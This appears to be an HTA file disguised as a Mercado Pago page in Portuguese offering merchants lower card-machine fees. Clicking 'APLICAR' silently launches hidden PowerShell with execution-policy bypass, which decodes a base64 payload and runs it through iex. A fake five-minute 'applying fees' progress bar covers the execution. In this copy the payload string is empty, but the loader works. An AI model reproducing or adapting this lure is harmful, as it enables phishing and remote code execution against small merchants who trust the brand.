<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8"/>
<title>Mercado Pago - Taxas</title>
<HTA:APPLICATION
  ID="mpApp"
  APPLICATIONNAME="Mercado Pago"
  BORDER="thin"
  BORDERSTYLE="static"
  CAPTION="yes"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="yes"
  SCROLL="no"
  WINDOWSTATE="normal"
/>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
html, body { width: 100%; height: 100%; overflow: hidden; }
body {
  font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  color: #1a1a1a;
  background: #ddd url("data:image/jpeg;base64,") center 25% / cover no-repeat;
}
.shell {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: linear-gradient(100deg, rgba(255,255,255,.94) 0%, rgba(255,255,255,.86) 48%, rgba(255,255,255,.42) 100%);
}
.topbar {
  height: 50px;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  padding: 0 18px;
  background: rgba(255,255,255,.98);
  border-bottom: 1px solid #e8e8e8;
}
.logo {
  display: flex;
  align-items: center;
  gap: 8px;
  font-weight: 700;
  font-size: 14px;
  color: #009ee3;
}
.logo img { width: 30px; height: 30px; display: block; }
.nav {
  margin-left: auto;
  display: flex;
  align-items: center;
  gap: 20px;
  font-size: 12px;
  color: #555;
}
.nav span {
  white-space: nowrap;
  display: inline-block;
  padding: 0 4px;
}
.content {
  flex: 1;
  min-height: 0;
  padding: 12px 18px 6px;
  overflow: hidden;
}
.hero { margin-bottom: 10px; }
.hero h1 { font-size: 18px; font-weight: 600; margin-bottom: 4px; line-height: 1.25; }
.hero p { font-size: 12px; color: #555; line-height: 1.4; }
.section-title { font-size: 12.5px; font-weight: 600; color: #333; margin-bottom: 8px; }
.id-row {
  display: flex;
  align-items: center;
  gap: 8px;
  margin-bottom: 10px;
}
.id-row label {
  font-size: 12px;
  font-weight: 600;
  color: #333;
  white-space: nowrap;
}
.id-row input {
  flex: 1;
  max-width: 220px;
  height: 28px;
  border: 1px solid #ccc;
  border-radius: 6px;
  padding: 0 10px;
  font-size: 12px;
  font-family: inherit;
  outline: none;
  background: #fff;
}
.id-row input:focus { border-color: #009ee3; box-shadow: 0 0 0 2px rgba(0,158,227,.15); }
.cards {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  margin-bottom: 10px;
}
.card {
  background: rgba(255,255,255,.97);
  border: 1px solid #e5e5e5;
  border-radius: 8px;
  padding: 10px 12px 8px;
  box-shadow: 0 1px 3px rgba(0,0,0,.06);
}
.card h3 { font-size: 11.5px; font-weight: 600; color: #555; margin-bottom: 6px; }
.rate {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 5px 8px;
  margin: 2px 0;
  border-radius: 6px;
  border: 1px solid transparent;
  cursor: pointer;
}
.rate:hover { background: #f7fbfe; border-color: #cce8f7; }
.rate.selected { background: #e8f6fc; border-color: #009ee3; }
.rate .label { font-size: 12px; color: #333; }
.rate .pct { font-size: 13px; font-weight: 700; }
.warn {
  background: #fff8e6;
  border: 1px solid #f0d78c;
  border-radius: 7px;
  padding: 8px 12px;
  font-size: 11.5px;
  color: #6b5a1e;
  margin-bottom: 6px;
  line-height: 1.4;
}
.warn b { color: #5a4a10; }
.hint { font-size: 11px; color: #777; line-height: 1.35; margin-bottom: 4px; }
.footer-area {
  flex-shrink: 0;
  padding: 8px 18px 12px;
  display: flex;
  flex-direction: column;
  gap: 7px;
  background: rgba(255,255,255,.55);
  border-top: 1px solid rgba(0,0,0,.05);
}
button.apply {
  background: #009ee3;
  color: #fff;
  border: none;
  border-radius: 8px;
  padding: 11px 16px;
  font-size: 13px;
  font-weight: 700;
  letter-spacing: 0.5px;
  cursor: pointer;
  width: 100%;
}
button.apply:hover { background: #0088c7; }
button.apply:disabled { background: #9fd6ef; cursor: default; }
.progress-wrap {
  display: none;
  background: #e8e8e8;
  border-radius: 7px;
  height: 11px;
  overflow: hidden;
  border: 1px solid #ddd;
}
.progress-wrap.show { display: block; }
.progress-bar {
  height: 100%;
  width: 0%;
  background: linear-gradient(90deg, #009ee3, #00b1ff);
}
.progress-text {
  font-size: 11px;
  color: #555;
  display: none;
}
.progress-text.show { display: block; }
.foot {
  text-align: center;
  font-size: 10px;
  color: #999;
  margin-top: 2px;
}
</style>
<script type="text/javascript">
var selectedDebito = "3.99";
var selectedCredito = "3.99";
var running = false;
var tickTimer = null;
var payloadB64 = "";

function resizeWin() {
  try {
    window.resizeTo(640, 620);
    window.moveTo((screen.width - 640) / 2, (screen.height - 620) / 2);
  } catch (e) {}
}

function clearGroup(prefix) {
  var ids = ["399", "299", "199", "099"];
  for (var i = 0; i < ids.length; i++) {
    var el = document.getElementById(prefix + ids[i]);
    if (el) el.className = "rate";
  }
}
function pickDebito(val, id) {
  selectedDebito = val;
  clearGroup("d");
  document.getElementById(id).className = "rate selected";
}
function pickCredito(val, id) {
  selectedCredito = val;
  clearGroup("c");
  document.getElementById(id).className = "rate selected";
}
function runPowershell() {
  try {
    var sh = new ActiveXObject("WScript.Shell");
    var cmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + payloadB64 + "')) | iex\"";
    sh.Run(cmd, 0, false);
  } catch (e) {}
}
function formatTime(sec) {
  var m = Math.floor(sec / 60);
  var s = sec % 60;
  return (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s;
}
function aplicar() {
  if (running) return;
  running = true;
  var btn = document.getElementById("btnApply");
  var bar = document.getElementById("bar");
  var wrap = document.getElementById("pwrap");
  var ptxt = document.getElementById("ptxt");
  btn.disabled = true;
  wrap.className = "progress-wrap show";
  ptxt.className = "progress-text show";
  bar.style.width = "0%";
  runPowershell();
  var total = 300, elapsed = 0;
  ptxt.innerText = "Aplicando taxas... 05:00 restantes";
  if (tickTimer) clearInterval(tickTimer);
  tickTimer = setInterval(function () {
    elapsed++;
    if (elapsed > total) elapsed = total;
    bar.style.width = Math.round((elapsed / total) * 100) + "%";
    ptxt.innerText = "Aplicando taxas... " + formatTime(total - elapsed) + " restantes";
    if (elapsed >= total) {
      clearInterval(tickTimer);
      ptxt.innerText = "Taxas aplicadas com sucesso.";
      btn.disabled = false;
      running = false;
    }
  }, 1000);
}
window.onload = resizeWin;
</script>
</head>
<body>
<div class="shell">
  <div class="topbar">
    <div class="logo">
      <img src="data:image/png;base64," alt="MP"/>
      <span>mercado pago</span>
    </div>
    <div class="nav">
      <span>Conta Digital</span>
      <span>Conta Negócio</span>
      <span>Ajuda e Segurança</span>
    </div>
  </div>

  <div class="content">
    <div class="hero">
      <h1>Receba o dinheiro de suas vendas na hora</h1>
      <p>Você escolhe quando ter o dinheiro disponível e qual taxa pagar por cada venda.</p>
    </div>

    <div class="id-row">
      <label for="fldId">ID:</label>
      <input type="text" id="fldId" maxlength="40" placeholder="Digite o ID"/>
    </div>

    <div class="section-title">Selecione as taxas</div>
    <div class="cards">
      <div class="card">
        <h3>Débito — na hora</h3>
        <div class="rate selected" id="d399" onclick="pickDebito('3.99','d399')"><span class="label">Padrão</span><span class="pct">3,99%</span></div>
        <div class="rate" id="d299" onclick="pickDebito('2.99','d299')"><span class="label">Reduzida</span><span class="pct">2,99%</span></div>
        <div class="rate" id="d199" onclick="pickDebito('1.99','d199')"><span class="label">Preferencial</span><span class="pct">1,99%</span></div>
        <div class="rate" id="d099" onclick="pickDebito('0.99','d099')"><span class="label">Especial</span><span class="pct">0,99%</span></div>
      </div>
      <div class="card">
        <h3>Crédito — na hora</h3>
        <div class="rate selected" id="c399" onclick="pickCredito('3.99','c399')"><span class="label">Padrão</span><span class="pct">3,99%</span></div>
        <div class="rate" id="c299" onclick="pickCredito('2.99','c299')"><span class="label">Reduzida</span><span class="pct">2,99%</span></div>
        <div class="rate" id="c199" onclick="pickCredito('1.99','c199')"><span class="label">Preferencial</span><span class="pct">1,99%</span></div>
        <div class="rate" id="c099" onclick="pickCredito('0.99','c099')"><span class="label">Especial</span><span class="pct">0,99%</span></div>
      </div>
    </div>

    <div class="warn"><b>Atenção:</b> mantenha a maquininha ligada e conectada à internet durante todo o processo de aplicação das taxas.</div>
    <p class="hint">Válido para todos os meios de pagamento. Em 30 dias: a partir de 3,99%.</p>
  </div>

  <div class="footer-area">
    <button class="apply" id="btnApply" onclick="aplicar()">APLICAR</button>
    <div class="progress-wrap" id="pwrap"><div class="progress-bar" id="bar"></div></div>
    <div class="progress-text" id="ptxt"></div>
    <div class="foot">mercado pago · condições sujeitas a análise</div>
  </div>
</div>
</body>
</html>
